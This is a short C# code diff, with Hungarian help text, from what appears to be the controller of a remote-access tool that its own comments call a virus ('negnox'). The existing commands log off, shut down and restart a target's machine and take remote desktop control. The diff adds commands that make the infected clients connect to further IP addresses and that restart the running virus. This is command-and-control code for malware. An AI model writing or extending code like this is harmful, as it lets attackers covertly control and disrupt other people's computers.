@@ -49,6 +49,8 @@ logoff       - kijelentkezteti a felhasználót
 shutdown     - lekapcsolja a gépet
 restart      - újraindítja a gépet
 audio [100]  - beállítja a hangerőt (itt pl 100-ra)
+subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást
+reloadclient - újra indítja a már futó vírust
 |//lokális parancsok|
 cdme         - könyvtárat vált ("")
 lsme         - ki listázza a könyvtár tartalmát
@@ -511,9 +513,37 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         
                     } else variables.Add(parancsok[0], "");
                     break;
-                    
 
 
+                case "subcontroller":
+                    //if (!CheckTargetEnabled()) break;
+                    Send("subcontroller");
+                    switch (xSplittelve[1])
+                    {
+                        case "add":
+                            Send($"add {xSplittelve[2]}");
+                            break;
+                        case "remove":
+                            Send($"remove {xSplittelve[2]}");
+                            break;
+                        case "list":
+                            Send($"list");
+                            break;
+                        default:
+                            Console.WriteLine("subcontroller add 'ip cím'    - hozzá ad egy új ipt");
+                            Console.WriteLine("subcontroller remove 'ip cím' - eltávolítja a bizonyos ip-t");
+                            Console.WriteLine("subcontroller list 'ip cím'   - kilistázza hány negnox serverre próbál csatlakozni");
+                            Send("-");
+                            break;
+                    }
+
+
+                    break;
+
+                case "reloadclient":
+                    Send("reload");
+                    Send("-");
+                    break;
 
 
 
